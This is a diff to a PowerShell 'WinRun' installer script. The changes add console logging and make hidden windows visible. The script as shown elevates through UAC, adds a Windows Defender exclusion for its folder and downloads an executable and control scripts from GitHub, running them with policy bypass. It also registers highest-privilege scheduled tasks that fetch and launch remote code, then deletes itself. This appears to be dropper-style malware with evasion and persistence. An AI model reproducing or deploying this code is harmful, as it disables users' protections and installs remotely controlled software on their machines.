@@ -1,6 +1,9 @@
 $ErrorActionPreference = "Continue"
 
+Write-Host "=== Starting WinRun Installer ===" -ForegroundColor Cyan
+
 $self = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
+Write-Host "Executable Path: $self" -ForegroundColor Gray
 
 $runDir = "$env:APPDATA\run"
 $runExe = "$runDir\run.exe"
@@ -15,22 +18,31 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
   [Security.Principal.WindowsBuiltInRole]::Administrator
 )
 
+Write-Host "isUpdate: $isUpdate | isAdmin: $isAdmin" -ForegroundColor Yellow
+
 if (-not $isUpdate -and -not $isAdmin) {
   try {
+    Write-Host "Requesting elevation via UAC..." -ForegroundColor Yellow
     Start-Process `
       -FilePath $self `
       -Verb RunAs
     exit
   }
   catch {
+    Write-Host "UAC elevation failed: $($_.Exception.Message)" -ForegroundColor Red
+    Read-Host -Prompt "Press Enter to exit..."
+    exit
   }
 }
 
 if (-not $isUpdate) {
   try {
+    Write-Host "Adding Defender exclusion for $runDir..." -ForegroundColor Yellow
     Add-MpPreference -ExclusionPath $runDir -ErrorAction SilentlyContinue | Out-Null
+    Write-Host "Defender exclusion added." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed to add Defender exclusion: $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
@@ -41,6 +53,7 @@ if (-not (Test-Path $datDir)) {
 New-Item -ItemType Directory -Path "$env:TEMP" -Force | Out-Null
 New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
+Write-Host "Stopping existing run and ss_control processes..." -ForegroundColor Yellow
 Get-Process -Name "run" -ErrorAction SilentlyContinue |
   Stop-Process -Force -ErrorAction SilentlyContinue
 
@@ -52,6 +65,7 @@ New-Item -ItemType Directory -Path $runDir -Force | Out-Null
 
 $ghHeaders = @{ "User-Agent" = "PowerShell-Installer" }
 
+Write-Host "Fetching latest commit SHA from GitHub..." -ForegroundColor Yellow
 try {
   $apiResponse = Invoke-RestMethod `
     -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" `
@@ -60,12 +74,15 @@ try {
     -ErrorAction Stop
 
   $latestCommit = $apiResponse.sha
+  Write-Host "Latest Commit SHA: $latestCommit" -ForegroundColor Green
 }
 catch {
   $latestCommit = "main"
+  Write-Host "Failed to fetch latest commit SHA, defaulting to 'main'" -ForegroundColor Red
 }
 
-# Download run.exe with fallback to main branch
+# Download run.exe
+Write-Host "Downloading run.exe..." -ForegroundColor Yellow
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
@@ -73,8 +90,10 @@ try {
     -Headers $ghHeaders `
     -UseBasicParsing `
     -ErrorAction Stop
+  Write-Host "run.exe downloaded successfully." -ForegroundColor Green
 }
 catch {
+  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
   try {
     Invoke-WebRequest `
       -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/run.exe" `
@@ -82,12 +101,15 @@ catch {
       -Headers $ghHeaders `
       -UseBasicParsing `
       -ErrorAction Stop
+    Write-Host "run.exe downloaded successfully from 'main'." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed downloading run.exe: $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
-# Download ss_installer.ps1 with fallback to main branch
+# Download ss_installer.ps1
+Write-Host "Downloading ss_installer.ps1..." -ForegroundColor Yellow
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
@@ -95,8 +117,10 @@ try {
     -Headers $ghHeaders `
     -UseBasicParsing `
     -ErrorAction Stop
+  Write-Host "ss_installer.ps1 downloaded successfully." -ForegroundColor Green
 }
 catch {
+  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
   try {
     Invoke-WebRequest `
       -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_installer.ps1" `
@@ -104,12 +128,15 @@ catch {
       -Headers $ghHeaders `
       -UseBasicParsing `
       -ErrorAction Stop
+    Write-Host "ss_installer.ps1 downloaded successfully from 'main'." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed downloading ss_installer.ps1: $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
-# Download ss_control.ps1 with fallback to main branch
+# Download ss_control.ps1
+Write-Host "Downloading ss_control.ps1..." -ForegroundColor Yellow
 try {
   Invoke-WebRequest `
     -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
@@ -117,8 +144,10 @@ try {
     -Headers $ghHeaders `
     -UseBasicParsing `
     -ErrorAction Stop
+  Write-Host "ss_control.ps1 downloaded successfully." -ForegroundColor Green
 }
 catch {
+  Write-Host "Download via commit SHA failed, trying fallback to 'main' branch..." -ForegroundColor Red
   try {
     Invoke-WebRequest `
       -Uri "https://raw.githubusercontent.com/yuan-miranda/run/main/frames_dev/ss_control.ps1" `
@@ -126,18 +155,24 @@ catch {
       -Headers $ghHeaders `
       -UseBasicParsing `
       -ErrorAction Stop
+    Write-Host "ss_control.ps1 downloaded successfully from 'main'." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed downloading ss_control.ps1: $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
+Write-Host "Verifying downloaded files..." -ForegroundColor Yellow
 if (
   -not (Test-Path $runExe) -or
   -not (Test-Path $installer) -or
   -not (Test-Path $ssControl)
 ) {
+  Write-Host "Verification Error: Required files are missing." -ForegroundColor Red
+  Read-Host -Prompt "Press Enter to exit..."
   exit
 }
+Write-Host "File verification passed." -ForegroundColor Green
 
 $taskName = "WinRun"
 $action = New-ScheduledTaskAction `
@@ -150,7 +185,7 @@ $settings = New-ScheduledTaskSettingsSet `
   -DontStopIfGoingOnBatteries `
   -ExecutionTimeLimit (New-TimeSpan -Days 365)
 
-$cmd = 'powershell.exe -Command "$p=\''$env:APPDATA\run\''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{\''User-Agent\'\'=\''PowerShell-Updater\''}; $sha=(Invoke-RestMethod \'\'https://api.github.com/repos/yuan-miranda/run/commits/main\'\' -Headers $h -UseBasicParsing).sha; $o=\''$p\installer.exe\''; Stop-Process -Name \'\'installer\'' -ErrorAction SilentlyContinue; Start-Sleep 1; Invoke-WebRequest -Uri \'\'https://raw.githubusercontent.com/yuan-miranda/run/\'' + $sha + \'\'/installer.exe\'\' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden } catch { }"'
+$cmd = 'powershell.exe -Command "$p=\''$env:APPDATA\run\''; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p | Out-Null }; try { $h=@{\''User-Agent\'\'=\''PowerShell-Updater\''}; $sha=(Invoke-RestMethod \'\'https://api.github.com/repos/yuan-miranda/run/commits/main\'\' -Headers $h -UseBasicParsing).sha; $o=\''$p\installer.exe\''; Stop-Process -Name \'\'installer\'' -ErrorAction SilentlyContinue; Start-Sleep 1; Invoke-WebRequest -Uri \'\'https://raw.githubusercontent.com/yuan-miranda/run/\'' + $sha + \'\'/installer.exe\'\' -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Normal } catch { }"'
 
 $installerTaskName = "WinRunInstaller"
 $installerAction = New-ScheduledTaskAction `
@@ -160,9 +195,9 @@ $installerAction = New-ScheduledTaskAction `
 $installerSettings = New-ScheduledTaskSettingsSet `
   -AllowStartIfOnBatteries `
   -DontStopIfGoingOnBatteries `
-  -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
-  -Hidden
+  -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
 
+Write-Host "Registering scheduled task '$taskName'..." -ForegroundColor Yellow
 try {
   Register-ScheduledTask `
     -TaskName $taskName `
@@ -171,6 +206,7 @@ try {
     -Settings $settings `
     -RunLevel Highest `
     -Force | Out-Null
+  Write-Host "Task '$taskName' registered successfully with Highest privileges." -ForegroundColor Green
 }
 catch {
   try {
@@ -180,11 +216,14 @@ catch {
       -Trigger $trigger `
       -Settings $settings `
       -Force | Out-Null
+    Write-Host "Task '$taskName' registered successfully." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed registering task '$taskName': $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
+Write-Host "Registering scheduled task '$installerTaskName'..." -ForegroundColor Yellow
 try {
   Register-ScheduledTask `
     -TaskName $installerTaskName `
@@ -192,6 +231,7 @@ try {
     -Settings $installerSettings `
     -RunLevel Highest `
     -Force | Out-Null
+  Write-Host "Task '$installerTaskName' registered successfully with Highest privileges." -ForegroundColor Green
 }
 catch {
   try {
@@ -200,12 +240,15 @@ catch {
       -Action $installerAction `
       -Settings $installerSettings `
       -Force | Out-Null
+    Write-Host "Task '$installerTaskName' registered successfully." -ForegroundColor Green
   }
   catch {
+    Write-Host "Failed registering task '$installerTaskName': $($_.Exception.Message)" -ForegroundColor Red
   }
 }
 
 if (Test-Path $installer) {
+  Write-Host "Executing ss_installer.ps1..." -ForegroundColor Yellow
   Start-Process powershell.exe `
     -ArgumentList @(
     '-NoProfile',
@@ -213,7 +256,8 @@ if (Test-Path $installer) {
     'Bypass',
     '-File',
     $installer
-  ) -WindowStyle Hidden -Wait
+  ) -WindowStyle Normal -Wait
+  Write-Host "ss_installer.ps1 execution completed." -ForegroundColor Green
 }
 
 $latestCommit | Out-File $datFile
@@ -235,13 +279,16 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
+Write-Host "Configured unique user: $uniqueUser" -ForegroundColor Cyan
 
 if (Test-Path $runExe) {
+  Write-Host "Launching run.exe..." -ForegroundColor Yellow
   Start-Process `
     -FilePath $runExe
 }
 
 if (Test-Path $ssControl) {
+  Write-Host "Launching ss_control.ps1..." -ForegroundColor Yellow
   Start-Process powershell.exe `
     -ArgumentList @(
     '-NoProfile',
@@ -249,7 +296,7 @@ if (Test-Path $ssControl) {
     'Bypass',
     '-File',
     $ssControl
-  ) -WindowStyle Hidden
+  ) -WindowStyle Normal
 }
 
 if ($installer) {
@@ -257,7 +304,7 @@ if ($installer) {
     -ArgumentList @(
     "-Command",
     "Start-Sleep 2; Remove-Item '$installer' -Force -ErrorAction SilentlyContinue"
-  ) -WindowStyle Hidden
+  ) -WindowStyle Normal
 }
 
 if ($self) {
@@ -266,5 +313,8 @@ if ($self) {
     "-Command",
     "Start-Sleep 4; Remove-Item '$self' -Force -ErrorAction SilentlyContinue"
   ) `
-    -WindowStyle Hidden
+    -WindowStyle Normal
 }
+
+Write-Host "=== WinRun Installer Completed Successfully ===" -ForegroundColor Green
+Read-Host -Prompt "Press Enter to exit..."
